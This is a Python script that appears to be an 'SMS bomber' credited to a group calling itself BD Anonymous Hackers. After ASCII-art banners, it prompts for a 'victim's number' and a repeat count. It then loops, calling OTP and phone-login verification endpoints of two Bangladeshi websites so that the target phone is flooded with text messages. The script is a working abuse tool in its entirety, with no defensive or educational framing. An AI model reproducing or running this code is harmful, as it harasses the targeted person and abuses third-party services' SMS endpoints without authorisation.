import os
import time
import sys
black="\033[1;90m"     
red="\033[1;91m"        
green="\033[1;92m"      
yellow="\033[1;93m"     
blue="\033[1;94m"       
purple="\033[1;95m"     
cyan="\033[1;96m"       
white="\033[1;97m"      


import sys
import time

def sprint(s):
	for c in s+"\n":
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(10/3000)








sprint(green+"============================================================")

sprint(red+"============================================================")

sprint(green+"""
______ _            _          ______                 _     
| ___ \ |          | |         | ___ \               | |    
| |_/ / | __ _  ___| | ________| |_/ / ___  _ __ ___ | |__  
| ___ \ |/ _` |/ __| |/ /______| ___ \/ _ \| '_ ` _ \| '_ \ 
| |_/ / | (_| | (__|   <       | |_/ / (_) | | | | | | |_) |
\____/|_|\__,_|\___|_|\_\      \____/ \___/|_| |_| |_|_.__/ 
""")
sprint(purple+"             <AN SMS CAN SEND UP TO TWO SMS>")
sprint(green+"\n              <WE ARE BD ANONYMOUS HACKERS>")

sprint(cyan+"\n            <THIS TOOL HAS BEEN MADE BY HIMU>")


sprint(red+"============================================================")

print(green+"============================================================")


time.sleep(12)
os.system("clear")


#import requests

sprint(cyan+"============================================================")

sprint(red+"============================================================")


sprint(yellow+"""
  _      _ _   _   _             ____              
 | |    (_) | | | | |           |  _ \             
 | |     _| |_| |_| | ___ ______| |_) | ___  _   _ 
 | |    | | __| __| |/ _ \______|  _ < / _ \| | | |
 | |____| | |_| |_| |  __/      | |_) | (_) | |_| |
 |______|_|\__|\__|_|\___|      |____/ \___/ \__, |
                                              __/ |
                                             |___/ 
""")


sprint(cyan+"============================================================")
sprint(red+"============================================================")

time.sleep(3)


import requests
num=str(input(yellow+"    ENTER VICTIME'S NUMBER = "))
time.sleep(3)
amu=int(input(green+"\n\n    ENTER YOUR AMOUNT = "))
os.system("clear")
anonymous="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+num

api2="https://portal.flipper.com.bd/api/v1/send-otp/login"

data2={"mobile_number":num}
for i in range(amu):
	requests.post(api2,data=data2)
	requests.get(anonymous)
	print(str(i+1)+"[SMS-HAD-SEND]")